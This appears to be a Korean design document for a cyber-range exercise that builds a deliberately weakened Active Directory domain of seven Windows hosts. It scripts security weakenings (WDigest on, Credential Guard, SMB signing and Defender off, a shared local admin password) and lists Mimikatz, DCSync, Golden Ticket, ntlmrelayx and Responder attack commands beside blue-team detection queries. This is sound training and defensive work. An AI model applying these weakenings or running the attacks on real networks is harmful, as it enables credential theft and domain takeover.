## 1. 개요

### 1.1 자산 목적

이 문서는 공공기관 INT 존에 배치되는 Windows 기반 자산 7대를 통합 설계한다. Active Directory 도메인 `corp.mois.local`을 중심으로 업무용 PC 5대, 관리자 PC 1대, 도메인 컨트롤러(DC) 1대가 하나의 인증 도메인을 구성한다.

| 자산 | IP | OS | 역할 |
|------|----|----|------|
| 업무용 PC-1 | 192.168.92.241 | Windows 10/11 Pro | 사용자 워크스테이션 (피싱 대상) |
| 업무용 PC-2 | 192.168.92.242 | Windows 10/11 Pro | 사용자 워크스테이션 |
| 업무용 PC-3 | 192.168.92.243 | Windows 10/11 Pro | 사용자 워크스테이션 |
| 업무용 PC-4 | 192.168.92.244 | Windows 10/11 Pro | 사용자 워크스테이션 |
| 업무용 PC-5 | 192.168.92.245 | Windows 10/11 Pro | 사용자 워크스테이션 |
| 관리자 PC | 192.168.92.246 | Windows 10/11 Pro | 도메인 관리자 워크스테이션 |
| 인증 서버 (AD/DC) | 192.168.92.209 | Windows Server 2022 | Active Directory Domain Controller |

### 1.2 시나리오상 핵심 역할: 내부 확산 및 도메인 장악

> **이 자산 그룹은 공격 체인의 STEP 2-4 ~ 2-6을 구현하는 핵심 거점이다.**

공격자는 DMZ 침투 후 내부 웹메일을 통해 피싱 이메일을 발송하고, 악성 LNK 파일을 통해 업무용 PC를 감염시킨다. 감염된 PC에서 Mimikatz로 자격증명을 탈취한 후, PsExec을 이용해 관리자 PC로 측면 이동한다. 최종적으로 DCSync 공격으로 krbtgt 해시를 탈취하여 Golden Ticket을 생성, 도메인 전체를 장악한다.

### 1.3 공격 체인 위치

```
[STEP 2-4] 피싱 이메일 → 업무용 PC 감염
    │
    │  공격자: 내부 웹메일 접근 성공 상태
    │
    ▼
user_lee(이서연)에게 피싱 메일 발송
    │  첨부: 악성 LNK 파일 (바로가기 위장)
    │
    ▼
업무용 PC-1 (192.168.92.241)에서 LNK 실행
    │  → PowerShell 다운로드 크래들 실행
    │  → Havoc C2 Demon agent 설치
    │
    ▼
[STEP 2-5] 자격증명 탈취
    │
    ▼
Mimikatz 실행 (Havoc C2 경유)
    ├─ SAM 데이터베이스 덤프 → 로컬 계정 해시
    ├─ LSA Secrets 덤프 → 서비스 계정 자격증명
    └─ sekurlsa::logonpasswords → 평문 비밀번호 (WDigest 활성화)
    │
    │  탈취: admin_kim / P@ssw0rd2024! (관리자 캐시된 자격증명)
    │
    ▼
[STEP 2-6] 측면 이동 → 도메인 장악
    │
    ▼
PsExec으로 관리자 PC (192.168.92.246)에 접속
    │  → admin_kim 계정 사용
    │
    ▼
관리자 PC에서 DCSync 공격 실행
    │  → lsadump::dcsync /domain:corp.mois.local /user:krbtgt
    │
    ▼
krbtgt NTLM 해시 탈취
    │
    ▼
Golden Ticket 생성
    │  → kerberos::golden /domain:corp.mois.local /sid:S-1-5-21-... /krbtgt:<hash>
    │
    ▼
도메인 전체 장악 완료 → STEP 2-7 (AI 어시스턴트) 진행
```

#### 5.3.3 PC-보안설정 GPO (의도적 약화)

```
컴퓨터 구성 → 정책 → 관리 템플릿:

1. WDigest 인증 활성화 (⚠ 평문 비밀번호 메모리 저장)
   경로: 컴퓨터 구성 → 관리 템플릿 → MS Security Guide
   레지스트리: HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
   값: UseLogonCredential = 1 (DWORD)

2. Credential Guard 비활성화 (⚠ Mimikatz 허용)
   경로: 컴퓨터 구성 → 관리 템플릿 → System → Device Guard
   레지스트리: HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard
   값: EnableVirtualizationBasedSecurity = 0 (DWORD)
   값: LsaCfgFlags = 0 (DWORD)

3. SMB 서명 필수 아님 (⚠ NTLM 릴레이 가능)
   경로: 컴퓨터 구성 → Windows 설정 → 보안 설정 → 로컬 정책 → 보안 옵션
   설정: "Microsoft 네트워크 클라이언트: 디지털 서명 통신(항상)" = 사용 안 함
   설정: "Microsoft 네트워크 서버: 디지털 서명 통신(항상)" = 사용 안 함

4. PowerShell 실행 정책 무제한 (⚠ 악성 스크립트 실행 허용)
   경로: 컴퓨터 구성 → 관리 템플릿 → Windows 구성요소 → Windows PowerShell
   설정: "스크립트 실행 켜기" = 사용, 실행 정책 = "모든 스크립트 허용"
   레지스트리: HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell
   값: ExecutionPolicy = "Unrestricted"

5. 로컬 관리자 비밀번호 동일 (⚠ LAPS 미적용)
   모든 PC 로컬 Administrator 비밀번호: LocalAdmin1!
   → Pass-the-Hash로 전체 PC 접근 가능
```

```powershell
# PC-보안설정 GPO 레지스트리 값 적용 스크립트
# (GPO 생성 후 레지스트리 기반 설정 적용)

$gpoName = "PC-보안설정"
New-GPO -Name $gpoName -Comment "워크스테이션 보안 설정 (훈련용 의도적 약화)"

# WDigest 활성화 (평문 비밀번호 메모리 저장)
Set-GPRegistryValue -Name $gpoName -Key "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
    -ValueName "UseLogonCredential" -Type DWord -Value 1

# Credential Guard 비활성화
Set-GPRegistryValue -Name $gpoName -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" `
    -ValueName "EnableVirtualizationBasedSecurity" -Type DWord -Value 0
Set-GPRegistryValue -Name $gpoName -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" `
    -ValueName "LsaCfgFlags" -Type DWord -Value 0

# PowerShell 실행 정책 Unrestricted
Set-GPRegistryValue -Name $gpoName -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell" `
    -ValueName "EnableScripts" -Type DWord -Value 1
Set-GPRegistryValue -Name $gpoName -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell" `
    -ValueName "ExecutionPolicy" -Type String -Value "Unrestricted"

# SMB 서명 비활성화
Set-GPRegistryValue -Name $gpoName -Key "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
    -ValueName "RequireSecuritySignature" -Type DWord -Value 0
Set-GPRegistryValue -Name $gpoName -Key "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" `
    -ValueName "RequireSecuritySignature" -Type DWord -Value 0

# GPO를 워크스테이션 OU에 연결
New-GPLink -Name $gpoName -Target "OU=워크스테이션,DC=corp,DC=mois,DC=local"
```

### VULN-2: Credential Guard 비활성화 (Mimikatz 허용)

**설명:** Windows Credential Guard가 비활성화되어 있어 lsass.exe 프로세스 메모리에서 자격증명을 직접 추출할 수 있다. Mimikatz의 `sekurlsa::logonpasswords`, `lsadump::sam` 등의 명령이 정상 동작한다.

**레지스트리 설정:**
```
키: HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard
값: EnableVirtualizationBasedSecurity = 0 (DWORD)
값: LsaCfgFlags = 0 (DWORD)

키: HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard
값: EnableVirtualizationBasedSecurity = 0 (DWORD)

키: HKLM\SYSTEM\CurrentControlSet\Control\Lsa
값: LsaCfgFlags = 0 (DWORD)
값: RunAsPPL = 0 (DWORD)  ← LSA 보호 모드도 비활성화
```

**PowerShell 적용:**
```powershell
# Credential Guard 비활성화
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v LsaCfgFlags /t REG_DWORD /d 0 /f

# LSA 보호 모드 비활성화
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 0 /f
```

**공격자 활용 (Mimikatz):**
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    ← 로그인된/캐시된 모든 자격증명 평문 추출
mimikatz # lsadump::sam                ← 로컬 SAM 데이터베이스 해시 추출
mimikatz # lsadump::secrets            ← LSA Secrets (서비스 계정 등) 추출
```

### VULN-3: 관리자 자격증명 캐시

**설명:** admin_kim(Domain Admin)이 업무용 PC-1에 IT 지원 목적으로 로그인한 이력이 있다. Windows는 기본적으로 최근 10개의 대화형 로그온 자격증명을 캐시하며, WDigest 활성화 시 평문 비밀번호도 메모리에 잔존한다.

### VULN-5: LAPS 미적용 (로컬 관리자 비밀번호 동일)

**설명:** LAPS(Local Administrator Password Solution)가 배포되어 있지 않아 모든 PC의 로컬 Administrator 비밀번호가 동일하다(`LocalAdmin1!`). 하나의 PC에서 로컬 해시를 탈취하면 Pass-the-Hash로 모든 PC에 접근할 수 있다.

**현재 상태:**

### VULN-6: PowerShell 실행 정책 Unrestricted

**설명:** PowerShell 실행 정책이 `Unrestricted`로 설정되어 있어 서명되지 않은 스크립트도 경고 없이 실행된다. 공격자의 다운로드 크래들, 인메모리 실행 등을 제한 없이 수행할 수 있다.

### VULN-7: SMB 서명 미적용

**설명:** SMB(Server Message Block) 패킷에 대한 디지털 서명이 필수가 아니므로, NTLM 릴레이 공격(ntlmrelayx)이 가능하다. 공격자는 중간자(MITM) 위치에서 SMB 인증을 릴레이하여 다른 시스템에 인증할 수 있다.

**레지스트리 설정:**
```
서버 측 (SMB 서버):
키: HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters
값: RequireSecuritySignature = 0 (DWORD)
값: EnableSecuritySignature = 0 (DWORD)

클라이언트 측 (SMB 클라이언트):
키: HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters
값: RequireSecuritySignature = 0 (DWORD)
값: EnableSecuritySignature = 0 (DWORD)
```

**GPO 설정 경로:**
```
컴퓨터 구성 → Windows 설정 → 보안 설정 → 로컬 정책 → 보안 옵션
  → "Microsoft 네트워크 서버: 디지털 서명 통신(항상)" = 사용 안 함
  → "Microsoft 네트워크 클라이언트: 디지털 서명 통신(항상)" = 사용 안 함
```

**공격 활용:**
```bash
# NTLM 릴레이 공격 (공격자 측)
ntlmrelayx.py -t smb://192.168.92.246 -smb2support -c "whoami"

# Responder로 LLMNR/NBNS 포이즈닝 후 릴레이
responder -I eth0 -rdw
ntlmrelayx.py -tf targets.txt -smb2support
```

### VULN-8: Kerberos 위임 설정 오류

```powershell
setspn -S MSSQLSvc/db01.corp.mois.local:1433 svc_sql
setspn -S MSSQLSvc/db01.corp.mois.local svc_sql

setspn -L svc_sql
```

### 10.4 PowerShell Script Block Logging


### 10.6 주요 탐지 시나리오 쿼리

#### 10.6.1 Mimikatz lsass 접근 탐지

```xml
<!-- Sysmon Event ID 10: lsass.exe에 대한 프로세스 접근 -->
<!-- GrantedAccess가 0x1010, 0x1038, 0x1438 등이면 Mimikatz 의심 -->
<QueryList>
  <Query Id="0">
    <Select Path="Microsoft-Windows-Sysmon/Operational">
      *[System[EventID=10]]
      and
      *[EventData[Data[@Name='TargetImage']='C:\Windows\System32\lsass.exe']]
      and
      *[EventData[Data[@Name='GrantedAccess']='0x1010' or Data[@Name='GrantedAccess']='0x1038' or Data[@Name='GrantedAccess']='0x1438' or Data[@Name='GrantedAccess']='0x143a']]
    </Select>
  </Query>
</QueryList>
```

#### 10.6.2 PsExec 측면 이동 탐지

```xml
<!-- Sysmon Event ID 1: PSEXESVC.exe 서비스 프로세스 생성 -->
<!-- + Security Event 4624 LogonType=3 (Network) with elevated token -->
<QueryList>
  <Query Id="0">
    <Select Path="Microsoft-Windows-Sysmon/Operational">
      *[System[EventID=1]]
      and
      *[EventData[Data[@Name='Image']='C:\Windows\PSEXESVC.exe']]
    </Select>
  </Query>
</QueryList>

<!-- Security: 원격 서비스 설치 (PsExec 서비스) -->
<QueryList>
  <Query Id="0">
    <Select Path="System">
      *[System[EventID=7045]]
      and
      *[EventData[Data[@Name='ServiceName']='PSEXESVC']]
    </Select>
  </Query>
</QueryList>
```

#### 10.6.3 DCSync 공격 탐지

```xml
<!-- Security Event 4662: Directory Service Access -->
<!-- DCSync는 DS-Replication-Get-Changes-All 권한을 사용 -->
<!-- GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (Replicating Directory Changes All) -->
<QueryList>
  <Query Id="0">
    <Select Path="Security">
      *[System[EventID=4662]]
      and
      *[EventData[Data[@Name='Properties'] and
        (contains(Data[@Name='Properties'],'1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')
         or contains(Data[@Name='Properties'],'1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'))]]
    </Select>
  </Query>
</QueryList>
```

#### 10.6.4 Golden Ticket 탐지

```xml
<!-- Security Event 4769: Kerberos Service Ticket Request -->
<!-- Golden Ticket 사용 시 비정상적인 서비스 이름, 암호화 유형, 소스 IP 탐지 -->
<!-- 특히 TGT의 암호화 유형이 RC4 (0x17)이면서 정책상 AES만 허용하는 경우 -->
<QueryList>
  <Query Id="0">
    <Select Path="Security">
      *[System[EventID=4769]]
      and
      *[EventData[Data[@Name='TicketEncryptionType']='0x17']]
    </Select>
  </Query>
</QueryList>

<!-- 비정상 TGT 수명: Golden Ticket은 기본 10년 수명 -->
<!-- Event 4768에서 Ticket Lifetime 필드 확인 -->
```

#### 10.6.5 Kerberoasting 탐지

```xml
<!-- Security Event 4769: 다수의 TGS 요청 (짧은 시간 내 다수 SPN 요청) -->
<!-- 특히 RC4 암호화 티켓 요청이 다수이면 Kerberoasting 의심 -->
<QueryList>
  <Query Id="0">
    <Select Path="Security">
      *[System[EventID=4769]]
      and
      *[EventData[Data[@Name='TicketEncryptionType']='0x17']]
      and
      *[EventData[Data[@Name='Status']='0x0']]
    </Select>
  </Query>
</QueryList>
```

### 11.6 [5단계] GPO 구성

```powershell
# ============================================================
# GPO 일괄 구성 스크립트
# DC01에서 실행
# ============================================================

Import-Module GroupPolicy

$domainDN = "DC=corp,DC=mois,DC=local"

# --- GPO 1: PC-보안설정 (의도적 약화) ---
$gpo1 = New-GPO -Name "PC-보안설정" -Comment "워크스테이션 보안 설정 (훈련용 의도적 약화)"

# WDigest 활성화
Set-GPRegistryValue -Name "PC-보안설정" `
    -Key "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
    -ValueName "UseLogonCredential" -Type DWord -Value 1

# Credential Guard 비활성화
Set-GPRegistryValue -Name "PC-보안설정" `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" `
    -ValueName "EnableVirtualizationBasedSecurity" -Type DWord -Value 0
Set-GPRegistryValue -Name "PC-보안설정" `
    -Key "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" `
    -ValueName "RunAsPPL" -Type DWord -Value 0

# PowerShell Unrestricted
Set-GPRegistryValue -Name "PC-보안설정" `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell" `
    -ValueName "EnableScripts" -Type DWord -Value 1
Set-GPRegistryValue -Name "PC-보안설정" `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell" `
    -ValueName "ExecutionPolicy" -Type String -Value "Unrestricted"

# SMB 서명 비활성화
Set-GPRegistryValue -Name "PC-보안설정" `
    -Key "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" `
    -ValueName "RequireSecuritySignature" -Type DWord -Value 0
Set-GPRegistryValue -Name "PC-보안설정" `
    -Key "HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" `
    -ValueName "RequireSecuritySignature" -Type DWord -Value 0

# Windows Defender 비활성화 (훈련 편의)
Set-GPRegistryValue -Name "PC-보안설정" `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" `
    -ValueName "DisableAntiSpyware" -Type DWord -Value 1
Set-GPRegistryValue -Name "PC-보안설정" `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" `
    -ValueName "DisableRealtimeMonitoring" -Type DWord -Value 1

# 로컬 Administrator 활성화
Set-GPRegistryValue -Name "PC-보안설정" `
    -Key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
    -ValueName "FilterAdministratorToken" -Type DWord -Value 0

# GPO 연결
New-GPLink -Name "PC-보안설정" -Target "OU=워크스테이션,$domainDN"

Write-Host "[+] PC-보안설정 GPO 구성 및 연결 완료" -ForegroundColor Green


# --- GPO 2: PowerShell-로깅 (블루팀용) ---
$gpo2 = New-GPO -Name "PowerShell-로깅" -Comment "PowerShell 스크립트 블록 로깅 (블루팀용)"

Set-GPRegistryValue -Name "PowerShell-로깅" `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
    -ValueName "EnableScriptBlockLogging" -Type DWord -Value 1

Set-GPRegistryValue -Name "PowerShell-로깅" `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" `
    -ValueName "EnableModuleLogging" -Type DWord -Value 1

Set-GPRegistryValue -Name "PowerShell-로깅" `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
    -ValueName "EnableTranscripting" -Type DWord -Value 1
Set-GPRegistryValue -Name "PowerShell-로깅" `
    -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
    -ValueName "OutputDirectory" -Type String -Value "C:\PSlogs"

New-GPLink -Name "PowerShell-로깅" -Target "$domainDN"

Write-Host "[+] PowerShell-로깅 GPO 구성 및 연결 완료" -ForegroundColor Green


# --- GPO 3: PC-방화벽정책 ---
```

> Havoc C2 프레임워크의 Demon agent는 레드팀이 업무용 PC 제어에 사용하는 핵심 도구이다. 이 문서에서는 에이전트가 설치되는 환경(Windows PC)의 설정만 다루며, C2 서버 자체의 구성은 레드팀 플레이북을 참조한다.

**Demon agent가 동작하기 위한 PC 환경 조건:**

| 조건 | 현재 설정 | 비고 |
|------|----------|------|
| Windows Defender | 비활성화 (GPO) | Demon 바이너리 탐지 방지 |
| PowerShell 실행 정책 | Unrestricted | 초기 스테이저 실행 허용 |
| AMSI | GPO로 비활성화 가능 | 인메모리 실행 시 우회 필요 |
| 네트워크 | 외부 C2 서버로 아웃바운드 HTTPS 허용 | 443/tcp |
